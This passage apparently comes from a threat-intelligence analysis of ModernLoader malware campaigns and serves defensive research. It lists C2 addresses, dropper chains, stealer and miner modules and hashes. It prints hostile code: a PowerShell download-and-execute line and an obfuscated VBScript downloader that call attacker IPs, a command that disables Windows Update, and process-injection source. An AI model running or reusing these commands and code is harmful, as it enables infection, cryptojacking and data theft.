offline.\n\n```image\nAlt: Avatar (ModernLoader) control panel login screen.\nDescription: The image depicts a login screen for a control panel labeled 'Welcome to Avatar.' The interface features two input fields, one for 'Login' and the other for 'Password,' accompanied by a 'Sign In' button. The overall aesthetic is dark-themed, suggesting a potentially malicious or clandestine application, consistent with the technical context of ModernLoader, which is a remote access trojan (RAT). This login screen is relevant as it represents part of the user interface for controlling the bot.\nTranscription: |\n  Welcome to\n  Avatar\n  \n  Login\n  Password\n  Sign In\n```\n\nModernLoader runs in an endless loop periodically contacting the C2 server for new tasks until the process is terminated.\n\nModernLoader is a staple of the campaigns we analyzed. Its main purpose is to download and execute additional payloads and modules, as instructed by the C2 server. Based on our telemetry data and the open-source intelligence, there are more than 10 additional modules hosted on the C2, but not all of them were available for download at the time of writing this post.\n\n### Earlier campaigns\n\nDuring the investigation, we discovered two earlier campaigns from March 2022 that are closely related to the campaign using 31[.]41[.]244[.]231 as the C2 server. Both campaigns use similar TTPs, with ModernLoader as the main bot that communicates with the C2 server and additional modules served by C2 servers with IP addresses:\n\n- 62[.]204[.]41[.]192\n- 62[.]204[.]41[.]71\n\nThere are a few clues that confirm the relationship between these campaigns. The first is the task given to one of the infected systems using 62[.]204[.]41[.]71 as the C2 server. We first see the connection of the infected system to the C2 server and then the task to execute a PowerShell command to download and execute a module from 62[.]204[.]41[.]192, the C2 server used in another campaign.\n\n```image\nAlt: Connecting two C2 servers in a C2 task assigned to the ModernLoader.\nDescription: The image shows a snippet of PowerShell code that is encoded. The code appears to be designed for downloading a file from a specified URL, specifically from the IP address 62.204.41.192. The use of 'New-Object Net.WebClient' suggests it is intended to create a web client object to facilitate the download process. This code is relevant to the context of the ModernLoader campaigns discussed in the provided paragraph, highlighting the technical aspects of the malware's functionality.\nTranscription: |\n  powershell -enc\n  KAB0AGUAdwA+E8AYgBqAGUAywB0ACAAQgBLAHQALgBXAGUAYgBDAGwAaQBLA4AdApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgA6ACgAJwBoAHQAdABwAdoAIAAwADYAMgAuADIAIAAwAC4AMQA5ADIALwBPA5AGYAZgBJAHAwASQBgAEUAYABYADsA\n  (New-Object Net.WebClient).DownloadString('http://62.204.41.192/Offer/www.cc')|IEX;\n```\n\nThe link between 31[.]41[.]244[.]231 and 62[.]204[.]41[.]71 is found in a downloader, which is a part of the set of standalone downloaders linked with these campaigns. They usually have the name `offer.exe` and are written in Visual Basic 6. These downloaders provide the second infection vector.\n\nThe downloader that proves the second link is `27bb9ee41bc7745854e3f3687955f1a6df3bbd74a7d1050a68fe0d0e6087b4b3`, which purports to be an update for the Brave web browser. The sample contains the code to launch PowerShell commands to download and run the code from:\n\n- hxxp[://]31[.]41[.]244[.]2311/AVAVA/WAW/Documents/go[.]oo\n- hxxp[://]31[.]41[.]244[.]2311/AVAVA/WAW/APPDATA/go[.]oo\n- hxxp[://]62[.]204[.]41[.]71/Offer/Offer[.]oo\n\nAlthough the original IP address here is mistyped, the similarity to the newest C2 IP address is strong enough to link these campaigns.\n\n### Droppers (vs_community.exe theme)\n\nThe internal name of many droppers is `vs_community.exe` that is likely done to convince users that the files are part of the Visual Studio community edition. Most of the droppers are created with the 7-Zip SFX Constructor tool and the version information strings are likely kept the same for all of the dropper files created in the campaign.\n\n### Payload modules received from the C2 server\n\n#### No.go\n\nhxxp:[//]31[.]41[.]244[.]231/0xNANA/no[.]go is the first URL we discovered when investigating anomalous daily PowerShell invocations. Like the Loader module, it consists of the `amsi.dll` module with the ability to disable the AMSI interface, the payload to be loaded into `RegSvcs.exe` and the payload injector module `friday.dll`.\n\nSince we already know how the process injection is implemented, we can focus on the payload. The payload is `auto.exe`, `142c333bef9eab4ce9d324e177572423c845ee399c01b4b78cfff730b4cb79b4` and another downloading stage. The stage creates a randomly named VB script and a randomly named installation information `.inf` file, which is opened using `cmstp.exe` (Connection Manager Profile Installer). The `.inf` file instructs the system to launch the VB script.\n\nThis somewhat convoluted execution of VB script is a likely attempt to circumvent the Windows User Account Control (UAC). The VB script is very similar to other VB scripts in the campaign and it simply attempts to download and execute PowerShell code from two URLs hosted on the C2 server.\n\n```image\nAlt: A randomly named VBS file is stored in the resource section of the auto.exe module.\nDescription: The image is a screenshot of a script written in VBScript. It appears to be part of a malicious payload, intended to execute various commands and potentially download additional modules from specified URLs. The code includes various string manipulations and commands to create objects and execute scripts, indicating it is designed to perform tasks typical in cyber attacks, such as evading detection and executing unwanted actions on a compromised system.\nTranscription: |\n  ' Advice me cousin an spring of needed. Tell us plead law ever yet new. Meant to learn of vexed if style allow he there. Tiled man stand tears joy the term years widen. Procuring continued suspicion its ten. Pursuit brother are had fifteen distant has. Early had add equal china quiet visit. Appear an has no limits either praise in. In in written on charmed justice is amiable farther besides. Law insensible middletons unapt for apartments boy delightful unreserved.\n  And produce say the ten moments parties. Simple in summer fat appear basket his desire joy. Outward clothes promise at melancholy but end appearance. And excellence partially estimating terminated day everything.\n  DELL=replace(\"{$j}{$s}cr{$j}ip{$j}t{$j}m{$j}ob{$j}se{$j}s{$j}ys{$j}m{$j}t{$j}p\",\"\")\n  DEL=Script.ScriptFullName:Set DEL=CreateObject(\"WScript.Shell\")\n  ' By in no ecstatic wondered disposal my speaking. Direct wholly valley or uneasy it at really. Sir wish like said dull and need make. Sportsman one bed departure rapturous situation disposing his. Off say yet ample ten ought hence. Depending in newspaper an september do existence strangers. Total great saw later had mirth happy new. Projecting pianoforte no of partiality is on.\n  On Error Resume Next\n  GIGI = \"w{LOGON}{LOGON}s{LOGON}{LOGON}ip{LOGON}.s{h{LOGON}{LOGON}e{LOGON}{LOGON}l{LOGON}1\"\n  GIGI = Replace(GIGI, \"{LOGON}\", \"\")\n  KIK = CreateObject(GIGI)\n  A = \"p{LOGON}{LOGON}we{LOGON}{LOGON}e{LOGON}{LOGON}n{LOGON}w{LOGON}ob{LOGON}:\"\n  SKLM1 = \"$c1={LOGON}d{LOGON}o{LOGON}wn{LOGON}l{LOGON}o{LOGON}ad{LOGON}(\"h{LOGON}tt{LOGON}p://{LOGON}31.41.244.231/delke/DEKL.go\")\"\n  SKLM2 = \"$c4={LOGON}d{LOGON}o{LOGON}wn{LOGON}l{LOGON}o{LOGON}ad{LOGON}(\"h{LOGON}tt{LOGON}p://{LOGON}31.41.244.231/0xNANA/ya.go\")\"\n  SKLM3 = \"$c3={LOGON}d{LOGON}o{LOGON}wn{LOGON}l{LOGON}o{LOGON}ad{LOGON}(\"h{LOGON}tt{LOGON}p://{LOGON}31.41.244.231/0xNANA/file/NANA.go\")\"\n  SKLM4 = \"$c2=$c4+$c3+$c1\"\n  SKLM5 = \"$TC=$c2.replace('{LOGON}','')\"\n  SKLM6 = \"IEX $TC\"\n  AIR.Run KIK = SKLM1 + SKLM2 + SKLM3 + SKLM4 + SKLM5 + SKLM6 + \"\", 0\n  ' Because one must be breding be answered ah. Spoil wretchedness her off cause any. Tears woman which no is world miles woody. Windows because one must. Law allow saved views hills day. Examine waiting his evening day passage proceed.\n  DEL.DeleteFile DE\n```\n\nUnfortunately, at the time of the analysis, but it also seems during the observed attack, the two modules `DEKL.go` and `ya.go` were not accessible. Nevertheless, the observed attack chain continues with the request to download and execute the next module, which is `Nana.go`, from hxxp[://]31[.]41[.]244[.]231/0xNANA/file/NANA[.]go.\n\nVB scripts employed in these campaigns contain the text that also exists in Emotet macro downloaders. It is not clear if they are an artifact of a code generator or they are taken from another source to make the detection of the script more difficult by randomizing some of the content. Although the comments contain grammatically correct sentences, they have very little meaning and may have been generated by something akin to the Markov Chain sentence generator.\n\n#### Nana.go\n\nDuring the observed attack, the `Nana.go` module is downloaded and executed with the filename `0xNax.exe`. The module checksum is `4621924ff1b05ad7c15bc4b5dad68f7c8c3eceaf7824444b149264eff79d4b9a` and is packed with UPX. The internal file version string name for this file indicates that it may be a Microsoft Visual Studio community installer. The `vs_community.exe` theme appears in the multiple files of the campaign. The name indicates that it may be spread on file sharing websites and P2P networks. The dropped file names in the campaign seem to be chosen to appear as legitimate Windows utilities.\n\nOnce unpacked, the module is a self-extracting 7-Zip file created with the 7-Zip SFX Constructor utility. The utility allows the user to add multiple files from a single folder to the 7-Zip archive with a stub that interprets a configuration data stored encrypted within the self-extracting file. The configuration data contains various instructions to the extractor stub, similar to a scripting engine. The scripting engine allows the user to specify where the file will be extracted and which commands should be run during the extraction process.\n\nThe Constructor utility seems to be targeted to Eastern European users with predefined script templates in Bulgarian, Polish, Hungarian, and Russian.\n\n```image\nAlt: 7-Zip SFX Constructor script editor.\nDescription: The image shows the script editor interface for the 7-Zip SFX Constructor utility. The editor displays a script with various configuration parameters for creating a self-extracting archive. The script includes sections for installation prompts, extraction messages, and language settings, indicating its capability to support multiple languages including Hungarian and possibly others. This tool is significant in the context of malware analysis, as it is linked to the creation of self-extracting files used in cyber attacks.\nTranscription: |\n  ;!@Install!UTF-8!\n  GUIMode=\"1\"\n  GUIFlags=\"48+32+64+2048+4096\"\n  MiscFlags=\"4\"\n  Title=\"!FolderName !Version\"\n  BeginPrompt=\"Now installing !FolderName !Version.\"\n  ExtractTitle=\"Installing !FolderName !Version\"\n  ExtractDialogText=\"Extracting files...\"\n  FinishMessage=\"Installing !FolderName !Version finish!\"\n  InstallPath=\"$ProgramFiles$\\!FolderName\"\n  ;!Project test config  китайский миропорядок  🐉\n  ;!InstallEnd!\n  \n  ; Hungarian\n  ; Magyar\n  ;!@Install!UTF-8:Language:1038!\n  BeginPrompt=\"Telepítés alatt a !FolderName !Version.\"\n  ExtractTitle=\"Telepítés !FolderName !Version\"\n  FinishMessage=\"!FolderName telepítése !Version Elkészült!\"\n  ;!InstallEnd:1038!\n```\n\nThe 7-Zip SFX files are used throughout the campaign and `nana.go` is just one of them. When executed, it will drop and launch two additional modules:\n\n- `C:\\Users\\<Username>\\AppData\\Roaming\\Log\\AppData.exe`, `7e73bc53cd4e540e1d492e6fd8ff630354cd8a78134e99bc0b252eccb559c97a`\n- `C:\\Users\\<Username>\\AppData\\Roaming\\Log\\OneDrive.exe`, `eb37c756c60a75068bfe88addd24e209080fe5383d25c919ea40fe78fff98612`\n\n`AppData.exe` is another self-extracting 7-Zip file with the internal filename `vs_community.exe`. When executed, it drops and runs the following files:\n\n- `C:\\Users\\<Username>\\AppData\\Roaming\\WinServer\\Log.exe` (`3f2f84147c55e5fc42261ace15ad55239d0bcba31a9acd20b99c999efbb9d392`)\n- `C:\\Users\\<Username>\\AppData\\Roaming\\WinServer\\AppData.exe` (`d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f`)\n\nThe `appdata.exe` in the WinServer folder is identical to the already mentioned `AUTORUNNN.exe`, which sets the registry key to launch the infection process when the user logs into the system.\n\nThe module `Log.exe` drops and runs additional files:\n\n- `C:\\Users\\<Username>\\AppData\\Roaming\\UpdatersHelper\\UpdatersHelper.exe` (`852857c66ee72f264c26d69c1f4092e99c2ed1fdcfef875f982fb75ed620ccc0`). Internally the module name is `BypassDefender`. This seems to be a variant of the BypassDefender project whose source code is available on GitHub and the purpose is to disable Windows defender by stopping its service and the associated processes.\n- `C:\\Users\\<Username>\\AppData\\Roaming\\UpdatersHelper\\UpdatersHelper.bat` (`435aa8b19125d795ada322aa8e30f3dd9afa03a4ac1350177c920426d1b17a47`). This is a batch file that sets a scheduled job to run the `UpdatersHelper.exe` executable module and sets its attributes to the system and hidden so that it is not displayed in the default Windows Explorer view.\n\n`OneDrive.exe` is an injector that injects a .NET loader into the process space of `conhost.exe`. The injected shellcode sets up the process for the next injection stage, which is a .NET assembly that drops and loads additional modules and starts a copy of XMRig to mine Monero using a pool on `pool.hashvault.pro` using the pool address `44Ds8fbC3HWQCcwQotgrNDUWnmDixpQPG7YLh5h2rzSMQrxCRXeSjQvH8LRPNGSyqvXcKeEk3umZ7T2wzFAgovF15UckBxg`.\n\n```image\nAlt: Recent OneDrive miner pool hash rate.\nDescription: The image displays a JSON-like structure containing configuration details for a mining operation using the XMRig miner. It includes parameters such as login credentials, agent information, mining algorithms, and various settings specific to the mining job. The structure indicates communication with a mining pool and outlines the expected responses and operations related to the mining process.\nTranscription: |\n  json\n  {\n    \"login\": \"44D58fC3HWCcWQotgNDUWmNdiXpQG7YlH5h2rzSMqrCRXeSjQvH8LRPNGSyqvXcKeK3umZ77wzFAgovF15UcK8xg\",\n    \"pass\": \"$\",\n    \"agent\": \"XMRig/6.17.0 (Windows NT 6.1; Win64; x64) libuv/1.38.0 msvc/2019\",\n    \"rigid\": \"1\",\n    \"algo\": \"rx/0\",\n    \"cn/2\": \"cn/r\",\n    \"cn/fast\": \"cn/half\",\n    \"cn/xao\": \"cn/rto\",\n    \"cn/nz\": \"cn/double\",\n    \"cn/ccx\": \"cn/lite/1\",\n    \"cn/heavy/1\": \"cn/heavy\",\n    \"cn/heavy/tube\": \"cn/heavy/xhv\",\n    \"cn/pico\": \"cn/upx2\",\n    \"cn/1\": \"cn/wow\",\n    \"rx/graft\": \"rx/sfx\",\n    \"rx/keva\": \"argon2/chukwa\",\n    \"argon2/chukwa2\": \"argon2/ninja\",\n    \"astrobw\": \"astrobw/v2\",\n    \"ghostrider\": \"1\"\n  }\n```\n\nBased on the observed traffic in the Hashvault dashboard, it seems that the number of infected systems using this particular pool is in the low hundreds, with relatively low mining yield. Looking at the geography, most of the connections are coming from Indonesia and other Asian countries, along with Eastern Europe.\n\nBefore executing the miner, the loader will attempt to load a watchdog process as well as the kernel driver that allows the writing of memory in kernel mode. The watchdog process, `sihost64.exe`, ensures that the miner is restored if the miner file is deleted and its process is restarted if terminated.\n\nSeveral other commands exist that could disable Windows and Windows Defender.\n\n```image\nAlt: Miner loader disables Windows update.\nDescription: The image displays a command-line script that appears to be used for disabling various Windows Update services and scheduled tasks related to Windows Update. It includes commands to stop services such as UsOc, WaaSMedicSvc, and others, as well as registry modifications that prevent automatic updates and related tasks from running. This script is likely part of a broader cyber threat strategy to disable security measures on infected systems.\nTranscription: \"C:\\Windows\\System32\\cmd.exe\" /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc /f & takeown /f %SystemRoot%\\System32\\WaaSMedicSvc.dll & icacls %SystemRoot%\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /c /q & rename %SystemRoot%\\System32\\WaaSMedicSvc.dll WaaSMedicSvc.BAK. dll & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v AUOptions /d 2 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\RebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN \"Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\" /DISABLE & SCHTASKS /Change /TN \"Microsoft\\Windows\\WindowsUpdate\\sih\" /DISABLE & SCHTASKS /Change /TN \"Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant\" /DISABLE & SCHTASKS /Change /TN \"Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun\" /DISABLE & SCHTASKS /Change /TN \"Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun\" /DISABLE\n```\n\nA scheduled task `GoogleUpdateTaskMachineQC` runs every time the user logs onto the system and launches the `OneDrive.exe` miner from `C:\\Users\\<Users>\\AppData\\Roaming\\OneDrive\\OneDrive.exe`.\n\nThe initial stub and the shellcode of the file is very similar to miners generated with a version of Silent Crypto Miner generator and the structure of the miner loader is also consistent with the loaders generated by the Silent Crypto Miner and SilentXMR projects.\n\n```image\nAlt: Decompiled miner loader code.\nDescription: The image displays a snippet of code, likely from a decompiled miner loader, written in a programming language that resembles C. The code appears to involve system-level operations such as creating processes, retrieving window directories, and utilizing various system call functions. The context suggests it is part of a malware analysis related to the ModernLoader campaign, specifically showing how the miner loader operates behind the scenes.\nTranscription: |\n  Sleep(0);\n  memset(&StartupInfo, 0, sizeof(StartupInfo));\n  StartupInfo.cb = 104;\n  v1 = 0i64;\n  v10 = 43643500164;\n  get_pgptr(&Value);\n  GetWindowsDirectoryA(Buffer, 0x104u);\n  Format = sub_401000((__int64 *)&s_s, 5);\n  v0 = sub_401000((__int64)System32_conhost_exe, 20);\n  sprintf(ApplicationName, Format, Buffer, v0);\n  v1 = sub_401000((__int64 *)&s_s2, 9);\n  sprintf(CommandLine, v1, ApplicationName, Value);\n  CreateProcessA(ApplicationName, CommandLine, 0i64, 0, 0x80000004u, 0i64, 0i64, &StartupInfo, &ProcessInformation);\n  sub_401960(ProcessInformation.hProcess, v1, 0i64, 122881864, 64164);\n  v2 = sub_401000((__int64 *)&Shellcode, (int)sunk_429BD4);\n  sub_401986(ProcessInformation.hProcess, &v1, &v2, 43643500164, 0i64);\n  sub_401A06(&v9, 0x2000000164, 0i64, v1, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64);\n  return 0i64;\n```\n\n```image\nAlt: Silent Crypto Miner loader source code.\nDescription: The image displays a snippet of C code used for process injection. It includes various function calls related to process creation, memory allocation, and writing shellcode into a target process's memory space. Key functions such as `CreateProcess`, `NtAllocateVirtualMemory`, and `NtWriteVirtualMemory` are visible, indicating the code's purpose is likely malicious, aimed at injecting a payload into another process.\nTranscription: |\n  c\n  int main(int argc, char** argv) {\n      Sleep(#DELAY # 1000);\n  \n      PROCESS_INFORMATION p_info;\n      STARTUPINFO s_info = {sizeof(s_info)};\n      LPVOID apointer = NULL;\n      SIZE_T size = #SHELLOCODELENGTH;\n      SIZE_T bytes = 0;\n      HANDLE hThread;\n      TCHAR* buffer;\n      TCHAR injectpath[MAX_PATH];\n      TCHAR args[MAX_PATH*2];\n  \n      _get_pgmptr(&buffer);\n      sprintf(injectpath, cipher(\"#FORMAT1\", #FORMATLENGTH), getenv(cipher(\"#ENV\", #ENVIRONMENT)), cipher(\"#TARGET\", #TARGETLENGTH));\n      sprintf(args, cipher(\"#FORMAT2\", #FORMAT2LENGTH), injectpath, #args);\n      CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);\n      NtAllocateVirtualMemory(p_info.hProcess, &apointer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n      NtWriteVirtualMemory(p_info.hProcess, apointer, cipher(\"#SHELLCODE\", size), size, &bytes);\n      NtProtectVirtualMemory(p_info.hProcess, &apointer, &size, PAGE_EXECUTE, NULL);\n      CreateThread(&hThread, GENERIC_EXECUTE, NULL, p_info.hProcess, apointer, FALSE, 0, 0, 0, NULL);\n      NtClose(p_info.hProcess);\n      NtClose(p_info.hThread);\n      return 0;\n  }\n```\n\nSilent Crypto Miner is a generator that allows users with little knowledge of programming to create effective and resilient miner loaders.\n\n```image\nAlt: Silent cryptocurrency miner builder form.\nDescription: The image depicts the interface of the 'Silent Crypto Miner Builder 2.5.0,' a tool used for creating cryptocurrency miners. The GUI includes sections labeled 'Main,' 'Startup,' 'Assembly,' 'Icon,' 'Options,' and 'Build,' allowing users to customize various aspects of the miner. There are buttons to add, edit, or remove miners, and a language selection dropdown set to English. The overall design suggests functionality for both novice and experienced users to generate mining software.\nTranscription: |\n  Silent Crypto Miner Builder 2.5.0\n  By Unam Sanctam\n  \n  Main\n  Miners:                               For help please check the wiki\n  \n                                      \n  \n                                      \n  \n  Add      Edit      Remove\n  \n  Language: English\n  \n  Save      Load\n```\n\n#### Meta, ww.cc and RegAsm.go\n\nThe PowerShell `meta` module is a loader that uses the similar three-assembly scheme to inject the payload `beachy.exe` into the process space of a newly created `RegSvcs.exe` process. `Beachy.exe` (`b71c43bf7af23ed6a12bdb7ce96a4755b8a7f285b8aa802484e8b2dfa191f14e`) is an obfuscated instance of the RedLine stealer using encrypted strings and legitimate class and function names to connect to the IP address 31[.]41[.]244[.]235:45692 as the C2 server.\n\n```image\nAlt: Standard RedLine stealer authorization disguised as legitimate software.\nDescription: The image displays a snippet of C# code used to create a communication channel in a network application. It defines a method named 'Id6' that takes a string 'address' as a parameter. The code constructs an IContextChannel using a ChannelFactory, specifying the endpoint address with a URI format based on the provided address. It highlights key components such as credential settings, service certificate validation, and message header creation, with a focus on authentication through X509 certificate validation mode. This technical detail is relevant to understanding the operation of the payload modules mentioned in the accompanying CTI context.\nTranscription: |\n  public bool Id6(string address)\n  {\n      bool result;\n      try\n      {\n          IContextChannel contextChannel = new ChannelFactory<System.Threading.IAsyncLocalK>(System.Runtime.Serialization.IDDataContractb.CreateBind(), new EndpointAddress(new Uri(\"net.tcp://\" + address + \"/\")), EndpointIdentity.CreateDnsIdentity(\"localhost\"), new AddressHeader[0])\n          {\n              Credentials =\n              {\n                  ServiceCertificate =\n                  {\n                      Authentication =\n                      {\n                          CertificateValidationMode = X509CertificateValidationMode.None\n                      }\n                  }\n              }\n          }.CreateChannel() as IContextChannel;\n          this.connector = (contextChannel as System.Threading.IAsyncLocalK);\n          new OperationContextScope(contextChannel);\n          string value = \"9d676174bb75fae2926c953902d64ae9\";\n          MessageHeader header = MessageHeader.CreateHeader(\"Authorization\", \"ns1\", value);\n          OperationContext.Current.OutgoingMessageHeaders.AddHeader(header);\n          result = true;\n      }\n      catch\n      {\n          result = false;\n      }\n      return result;\n  }\n```\n\n#### RedLine URL\n\nContrary to the URL name that serves this module, hxxp[://]31[.]41[.]244[.]231/0x/?0=RedLine, this module does not inject a variant of the RedLine stealer, but a variant of the ModernLoader bot (`53b09a7c8bf41ed9015b8e3a98fb8b8581e82d17c1ead0bd0293f2e3e9996519`).\n\nAs is the case with the original Loader module, the RedLine PowerShell script creates a new `RegSvcs.exe` hollowed process that launches the next stage of the injector that eventually moves the ModernLoader assembly `client.exe` into a newly created and hollowed `svchost.exe` process. This connects to the latest ModernLoader C2 script at hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php.\n\nThe RedLine module is usually downloaded by any of the standalone `offer.exe` executables (`dc5255a5bcc89266ea0c7ca79f7a52ab281cbb6cc1980ee5b3a818114c01b93c`), which also eventually downloads other modules to be executed:\n\n- hxxp[://]31[.]41[.]244[.]231/0xMine/RegAsm[.]go\n- hxxp[://]31[.]41[.]244[.]231/0xSocks/go[.]go - a simple script to download and launch `socks.go` module\n- hxxp[://]31[.]41[.]244[.]231/0xMine/go[.]go - a simple script to download and launch `mine.go` module\n\n#### Mine.go\n\nAs opposed to the original and the RedLine loaders, the `Mine.go` and `Socks.go` modules are not PowerShell scripts but Windows PE executables that are downloaded and launched by the previous commands downloaded from hxxp[://]31[.]41[.]244[.]231/0xMine/go[.]go and hxxp[://]31[.]41[.]244[.]231/0xSocks/go[.]go respectively.\n\nThe embedded modules in resources (encrypted) are:\n\n- `Sihost64` (watchdog): Ensures the miner is running, injected by `runpe` module loaded into `conhost.exe`.\n- `Injector` (`RunPE.Run`): Injects PE files in a process name specified as an argument to the function.\n- `WR64.sys`: Driver that may allow writing to kernel mode memory.\n- `mr`: XMRig executable for Monero mining.\n- `th`: ethminer.\n\n```image\nAlt: Decompiled miner code.\nDescription: The image depicts a snippet of decompiled C# code, likely related to a cryptocurrency mining operation. The code includes a `Main` method with a `try` block that contains a `Thread.Sleep(0);` command, and a `catch` block that appears to handle exceptions. The code also involves the use of `Path.Combine` and `Mine.Decrypt` methods, indicating that it is retrieving and decrypting paths in the application's data folder. This suggests functionality related to loading or executing further components of the mining software.\nTranscription: |\n  public static void Main()\n  {\n      try\n      {\n          Thread.Sleep(0);\n      }\n      catch (Exception)\n      {\n      }\n  \n      string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Mine.Decrypt(\"OoZvDMTkd9ESLEVIUwA +CQ==\"));\n      string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Mine.Decrypt(\"H84gZUvRCRvjTNXahmgGtsZlgUwOmLhHCNDubKciw==\"));\n      try\n      {\n      }\n  }\n```\n\nThe .NET miner loader is very similar to the code generated by the Silent cryptocurrency miner, as seen in the `Nana.go` `OneDrive.exe` miner.\n\nThe major difference between the two is in the folders used to drop additional components and the mining pool site used for mining. `Mine.go` is using `pool.supportxmr.com` on TCP port 3333 for mining and the address is the same: `44Ds8fbC3HWQCcwQotgrNDUWnmDixpQPG7YLh5h2rzSMQrxCRXeSjQvH8LRPNGSyqvXcKeEk3umZ7T2wzFAgovF15UckBxg`.\n\n#### Mines.go\n\nThe `Mines.go` module (`21e72be7f818e2afd4d53ee8f16c7e4a4718a95dd75b90d83fa26181e426f578`) is another miner, but this time, the actors chose to use the so-called “Sapphire Multi-Coin” miner that’s advertised on various forums for sale since at least February 2022. The module is observed to be downloaded by a small `gos.go` script, which is downloaded by one of the standalone downloaders (`1c58274fbbeaf7178a478aea5e27b52d5ead7c66e24371a4089568fa6908818c`).\n\nThe miner module copies itself into `%LOCALAPPDATA%\\OneDrive\\OneDrive.exe` and creates a scheduled task to run the `OneDrive.exe` every minute. The miner creates the mutex `39cb3ed9d64849789471d05f94b7b62a` that checks if the module is already running in memory.\n\n```image\nAlt: Sapphire miner advertisement.\nDescription: The image is an advertisement for the 'Sapphire Multi-Coin Miner.' It features a laptop with the miner's logo prominently displayed on the screen. Below the laptop, there are sections detailing the miner's capabilities, such as 'Smart Coin Detection,' 'Bypass Windows Defender,' 'Advanced P&P System,' and 'Lightweight Obfuscation.' Each section offers brief descriptions of the features that enhance the miner's effectiveness and stealth, highlighting its ability to evade detection by antivirus software and maintain persistence on infected systems.\nTranscription: |\n  SAPPHIRE MULTI-COIN MINER\n  \n  Advanced P&P System\n  With our advanced persistence and protection system you can:\n  - Protect your miner from getting terminated or closed.\n  - Hide the miner when TaskManager or ProcessHacker is opened.\n  - Create an invisible persistence which opens the miner every few minutes to prevent it from getting closed (watchdog).\n  \n  Smart Coin Detection\n  Select the best coins to mine depending on the victims GPU and get the most profit by mining Monero and Ethereum, Ethereum Classic or Ergo.\n  \n  Bypass Windows Defender\n  Windows Defender is the most used Anti Virus and we can bypass it easily on scantime & runtime. Using a crypter is still highly recommended!\n  \n  Lightweight Obfuscation\n  To make your build more unique and protected we have integrated some obfuscation features like (ControlFlow, Junkcode, Int Confusion, Renaming and much more)\n```\n\nThe miner is written in Golang and it is a wrapper around the XMRig miner. Based on the configuration, which can be downloaded from a remote server, the golang portion of the miner loads the XMRig miner, sets the registry key to ensure the miner is loaded and prepares the required parameters to choose which cryptocurrency will be mined based on the amount of RAM on the infected system.\n\nThe miner loader will attempt to read the encrypted zip miner archive from the registry entry `HKCU>\\SOFTWARE\\Wow64\\<SHA256_encrypted>` (`96cd98d42b896f6c92fd97b435d727497102ca91ce6e95252251a28e0c3fb9f8`) if it exists. If it does not, the Sapphire loader will attempt to download it from the URL predefined in its configuration.\n\nBased on the GPU type and the amount of RAM of the infected host, the Sapphire miner injected XMR using process-hollowing into the process space of a newly created `svchost.exe` process or a `smartscreen.exe` process.\n\n```image\nAlt: The miner executable is downloaded and decrypted before being injected into a process.\nDescription: The image displays a snippet of assembly code, likely related to the operation of the Sapphire Multi-Coin miner. It includes various assembly instructions such as 'mov', 'call', and 'test', which indicate the manipulation of data and function calls within the code to handle tasks like file retrieval and AES decryption. This code is indicative of the underlying mechanics that enable the miner to function, specifically related to decrypting and accessing a miner executable.\nTranscription: |\n  mov [rsp+180h+var_B8], rax\n  mov [rsp+180h+var_108], rbx\n  mov [rsp+180h+var_110], rcx\n  call main_GetMinerFile\n  mov rdi, rax\n  mov rsi, rbx\n  mov r8, rcx\n  mov rax, [rsp+180h+var_B8]\n  mov rbx, [rsp+180h+var_108]\n  mov rcx, [rsp+180h+var_110]\n  call main_DecryptAES\n  mov [rsp+180h+var_128], rbx\n  mov rbx, rax\n  lea rax, off_65CC0\n  call archive_zip_NewReader\n  nop\n  dword ptr [rax]\n  test rbx, rbx\n```\n\nThe actual XMRig miner can be stored on the remote server, and in the case of the `Mines.go` module, the miner is downloaded from hxxp[://]31[.]41[.]244[.]231/0xMine/Temp[.]exe. The downloaded file is an AES-encrypted ZIP file that contains the XMRig miner and the `WinRing0x64.sys` helper driver. As above, the XMRig is configured to use `pool.supportxmr.com` on TCP port 3333 with the same mining pool address.\n\n#### Socks.go\n\nThe `Socks.go` module is an executable protected with Themida protector. The module contains a variant of the SystemBC back connect remote access Trojan with proxy functionality. The SystemBC connects to the same C2 IP address as the RedLine stealer module — 31[.]41[.]244[.]235 — but it uses TCP port 4440. SystemBC may allow the attacker to use the infected system as a proxy for their activities.\n\n#### Autorun\n\nThe command to download and run the `Autorun` module by the ModernLoader bot is often observed together with the `Meta` module. The autorun downloads and runs the module `autorunnn.exe`, which sets a scheduled task to download and run the initial infection HTA application file hosted on the C2 server hxxp[://]31[.]41[.]244[.]231/0x?0=WindowsAnalyticsConfiguration. It also modifies a value in the registry key `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` so that the same `mshta` command is run when a user logs onto the system.\n\n#### Hello.go\n\n`Hello.go` module (`3232126860f3729dda59f9db6476773997b4bcfb08e2e4b32b5214c30507d775`), downloaded by at least one of the standalone downloaders (`1c58274fbbeaf7178a478aea5e27b52d5ead7c66e24371a4089568fa6908818c`), is a `vs_community.exe` UPX packed self-extracting 7-Zip dropper which drops and runs a number of other modules, most of them are focused on mining, and some on 